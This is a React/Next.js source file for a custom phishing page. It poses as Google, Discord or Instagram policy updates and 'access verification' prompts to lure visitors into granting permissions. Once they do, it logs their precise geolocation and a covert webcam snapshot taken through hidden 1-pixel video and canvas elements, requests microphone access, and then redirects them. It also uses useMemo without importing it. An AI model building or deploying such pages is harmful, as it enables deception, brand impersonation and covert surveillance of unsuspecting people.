"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useParams, useSearchParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout';
import type { LocationData, CameraData, AudioData } from '@/types';
import { Button } from '@/components/ui/button';
import { Loader2 } from 'lucide-react';

// Base template UI cues (can be expanded)
const baseTemplateContents: Record<string, { title: string, message: string, actionText?: string }> = {
  'default': { title: 'Service Interaction', message: 'Please follow the instructions to continue.', actionText: 'Start Process' },
  'restricted-website-access': { title: 'Access Restricted', message: 'To access this site, we need to verify some details.', actionText: 'Begin Verification' },
  'geo-restricted-service-access': { title: 'Service Unavailable', message: 'To check service eligibility, please proceed.', actionText: 'Check Eligibility' },
  'content-unlock': { title: 'Unlock Content', message: 'Verify to access exclusive content.', actionText: 'Unlock Now' },
  'google-policy-update': { title: 'Google Policy Update', message: 'Accept terms and verify to continue.', actionText: 'Accept & Verify' },
  'discord-terms-update': { title: 'Discord Terms Update', message: 'Accept terms and verify to continue.', actionText: 'Accept & Verify' },
  'instagram-privacy-update': { title: 'Instagram Privacy Update', message: 'Accept policy and verify to continue.', actionText: 'Accept & Verify' },
  'voice-assistant': { title: 'Setup Voice Assistant', message: 'Calibrate and verify for setup.', actionText: 'Start Setup' },
  'speech-to-text': { title: 'Speech-to-Text Demo', message: 'Enable features to start demo.', actionText: 'Start Demo' },
  'quality-check': { title: 'Audio Quality Check', message: 'Perform checks to continue.', actionText: 'Start Checks' },
};

// For handling redirects based on base template ID (copied from PhishingLinkCard)
const REDIRECT_URL_KEYS: Record<string, string> = {
  'content-unlock': 'contentUnlockRedirectUrl',
  'restricted-website-access': 'restrictedWebsiteRedirectUrl',
  'geo-restricted-service-access': 'geoRestrictedServiceRedirectUrl',
  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
};

type CaptureType = 'location' | 'camera' | 'audio';
type CaptureStatus = 'pending' | 'capturing' | 'success' | 'error' | 'skipped';

interface StatusMessage {
  type: CaptureType;
  status: CaptureStatus;
  message?: string;
}

export default function CustomPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams<{ id: string }>();
  const searchParams = useSearchParams();

  const templateId = params.id || 'default';
  const captureQuery = searchParams.get('capture');

  const requestedCaptureTypes = useMemo(() =>
    (captureQuery?.split(',') || [])
      .map(type => type.trim().toLowerCase())
      .filter(type => ['location', 'camera', 'audio'].includes(type)) as CaptureType[],
    [captureQuery]
  );

  const pageContent = baseTemplateContents[templateId] || baseTemplateContents.default;

  const [currentCaptureIndex, setCurrentCaptureIndex] = useState(-1); // -1 means not started
  const [statusMessages, setStatusMessages] = useState<StatusMessage[]>([]);
  const [isCapturingProcessActive, setIsCapturingProcessActive] = useState(false);
  const [allDone, setAllDone] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);


  const logInitialVisit = useCallback(() => {
    addLog({
      type: 'generic',
      data: {
        message: `Visited custom phishing page: /phishing/custom/${templateId}`,
        requestedCapture: requestedCaptureTypes.join(','),
      }
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId, requestedCaptureTypes]); // addLog is stable

  useEffect(() => {
    logInitialVisit();
  }, [logInitialVisit]);


  const updateStatus = (type: CaptureType, status: CaptureStatus, message?: string) => {
    setStatusMessages(prev => {
      const existingMsgIndex = prev.findIndex(m => m.type === type);
      if (existingMsgIndex > -1) {
        const updated = [...prev];
        updated[existingMsgIndex] = { type, status, message };
        return updated;
      }
      return [...prev, { type, status, message }];
    });
  };

  const proceedToNextCapture = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
        videoRef.current.srcObject = null;
    }
    setCurrentCaptureIndex(prev => prev + 1);
  }, []);

  const captureLocation = useCallback(async () => {
    updateStatus('location', 'capturing', 'Requesting location access...');
    if (!navigator.geolocation) {
      updateStatus('location', 'error', 'Geolocation is not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Geolocation not supported' } });
      proceedToNextCapture();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        addLog({ type: 'location', data: locationData });
        updateStatus('location', 'success', `Location captured: ${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`);
        proceedToNextCapture();
      },
      (err) => {
        let errorMessage = 'Location error: Could not retrieve location.';
        if (err.code === err.PERMISSION_DENIED) errorMessage = 'Location error: Access denied by user.';
        addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
        updateStatus('location', 'error', errorMessage);
        proceedToNextCapture();
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  }, [addLog, proceedToNextCapture]);

  const captureCamera = useCallback(async () => {
    updateStatus('camera', 'capturing', 'Requesting camera access...');
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('camera', 'error', 'Camera access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Camera access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = streamRef.current;
        videoRef.current.onloadedmetadata = () => {
          if(videoRef.current) videoRef.current.play();
          // Capture after a short delay
          setTimeout(() => {
            if (videoRef.current && canvasRef.current && videoRef.current.readyState >= HTMLMediaElement.HAVE_METADATA) {
              const video = videoRef.current;
              const canvas = canvasRef.current;
              const MAX_WIDTH = 320;
              const MAX_HEIGHT = 240;
              let { videoWidth, videoHeight } = video;
              if (videoWidth > MAX_WIDTH) { videoHeight = (videoHeight * MAX_WIDTH) / videoWidth; videoWidth = MAX_WIDTH; }
              if (videoHeight > MAX_HEIGHT) { videoWidth = (videoWidth * MAX_HEIGHT) / videoHeight; videoHeight = MAX_HEIGHT; }
              canvas.width = videoWidth; canvas.height = videoHeight;
              const context = canvas.getContext('2d');
              context?.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageUrl = canvas.toDataURL('image/jpeg', 0.7);
              addLog({ type: 'camera', data: { imageUrl } as CameraData });
              updateStatus('camera', 'success', 'Camera snapshot captured.');
            } else {
              updateStatus('camera', 'error', 'Failed to process video stream for capture.');
            }
            proceedToNextCapture();
          }, 1000); // Delay for stream to stabilize
        };
        videoRef.current.onerror = () => {
            updateStatus('camera', 'error', 'Video element error.');
            addLog({ type: 'generic', data: { message: 'Custom capture: Video element error' } });
            proceedToNextCapture();
        }
      }
    } catch (err) {
      let errorMessage = 'Camera error: Could not access camera.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Camera error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('camera', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  const captureAudio = useCallback(async () => {
    updateStatus('audio', 'capturing', 'Requesting microphone access...');
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('audio', 'error', 'Microphone access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Microphone access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ audio: true });
      // Simulate recording then log
      updateStatus('audio', 'capturing', 'Microphone access granted. Simulating recording...');
      setTimeout(() => {
        addLog({ type: 'audio', data: { message: 'Audio capture simulated successfully.' } as AudioData });
        updateStatus('audio', 'success', 'Audio capture simulated.');
        proceedToNextCapture();
      }, 1500);
    } catch (err) {
      let errorMessage = 'Audio error: Could not access microphone.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Audio error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('audio', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  useEffect(() => {
    if (currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
      const typeToCapture = requestedCaptureTypes[currentCaptureIndex];
      if (typeToCapture === 'location') captureLocation();
      else if (typeToCapture === 'camera') captureCamera();
      else if (typeToCapture === 'audio') captureAudio();
    } else if (currentCaptureIndex >= requestedCaptureTypes.length && requestedCaptureTypes.length > 0 && isCapturingProcessActive) {
      // All requested captures attempted
      setAllDone(true);
      setIsCapturingProcessActive(false); // Stop the overall process indication
      updateStatus(requestedCaptureTypes[requestedCaptureTypes.length-1], 'success', 'All capture attempts finished.'); // Update last status as an overall marker

      // Handle redirection if applicable
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          updateStatus('default' as CaptureType, 'capturing', `Process complete. Redirecting in 3 seconds...`);
          setTimeout(() => { window.location.href = redirectUrl; }, 3000);
        }
      }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentCaptureIndex, requestedCaptureTypes, isCapturingProcessActive]); // Removed captureLocation, etc., to avoid re-triggering, managed by index

  const startCaptureProcess = () => {
    if (requestedCaptureTypes.length > 0) {
      setIsCapturingProcessActive(true);
      setStatusMessages(requestedCaptureTypes.map(type => ({ type, status: 'pending' })));
      setCurrentCaptureIndex(0); // Start with the first type
    } else {
        updateStatus('default' as CaptureType, 'error', 'No valid data capture types specified to start.');
    }
  };

  // Cleanup stream on unmount
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  return (
    <PhishingPageLayout title={`Custom Action: ${pageContent.title}`}>
      {/* Hidden elements for camera capture */}
      <video ref={videoRef} className="hidden w-[1px] h-[1px]" playsInline muted />
      <canvas ref={canvasRef} className="hidden w-[1px] h-[1px]" />

      <div className="space-y-4 text-center">
        <h1 className="text-xl font-semibold">{pageContent.title}</h1>
        <p className="text-muted-foreground">{pageContent.message}</p>

        {!isCapturingProcessActive && !allDone && (
          <Button onClick={startCaptureProcess} disabled={requestedCaptureTypes.length === 0} size="lg">
            {pageContent.actionText || 'Start Process'}
          </Button>
        )}

        {isCapturingProcessActive && !allDone && <Loader2 className="h-8 w-8 animate-spin mx-auto text-primary" />}

        <div id="capture-status" className="my-4 space-y-2 text-left">
          {statusMessages.map((msg, index) => (
            <div key={index} className={`p-2 border rounded-md text-sm ${
              msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
              msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
              msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
              'bg-gray-100 border-gray-300'
            }`}>
              <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
              {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
            </div>
          ))}
        </div>

        {allDone && (
          <p className="text-lg font-semibold text-green-600 p-4 bg-green-50 rounded-md">
            All requested actions have been processed. This window may redirect or can be closed.
          </p>
        )}

        {requestedCaptureTypes.length === 0 && !isCapturingProcessActive && (
          <p className="text-red-600 font-medium">No valid data capture types were specified in the link.</p>
        )}
      </div>
    </PhishingPageLayout>
  );
}
